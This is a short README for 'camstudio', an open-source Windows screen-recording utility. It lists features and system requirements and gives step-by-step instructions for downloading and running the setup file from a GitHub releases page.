# 🎥 camstudio - Simple Screen Recording for Everyone

## 🚀 Getting Started

Welcome to camstudio! This is an open-source screen recording utility for Microsoft Windows. It enables you to easily capture your screen and create high-quality videos. Follow the steps below to download and run camstudio without any hassle.

## 📦 Download

[![Download camstudio](https://img.shields.io/badge/Download-camstudio-blue.svg)](https://github.com/caterpie00/camstudio/releases)

## 🔍 Features

- **Screen Recording:** Capture your entire screen or just a selected region.
- **High-Quality Output:** Save recordings in AVI format with lossless quality.
- **Cursor Recording:** Highlight mouse movements for better tutorials.
- **User-Friendly Interface:** Easy navigation for all skill levels.
- **Open Source:** Join a community-focused project.

## 💡 System Requirements

To run camstudio, ensure your system meets these basic requirements:

- **Operating System:** Microsoft Windows 7 or later
- **Processor:** 1 GHz or faster
- **RAM:** 2 GB or more
- **Disk Space:** At least 100 MB of free space
- **Video Card:** A graphics card supporting DirectX 9 or later

## 🔗 Download & Install

To start using camstudio, visit this page to download: [camstudio Releases](https://github.com/caterpie00/camstudio/releases). Here, you will find the latest version and older releases.

Once you reach the Releases page, follow these steps:

1. Scroll down to find the latest version listed at the top.
2. Select the **assets** section under the release.
3. Click on the **setup file** to download it to your computer.
4. After the download is complete, locate the file in your downloads folder.
5. Double-click the setup file to run the installer.

Once installed, you can start camstudio and begin recording your screen effortlessly.
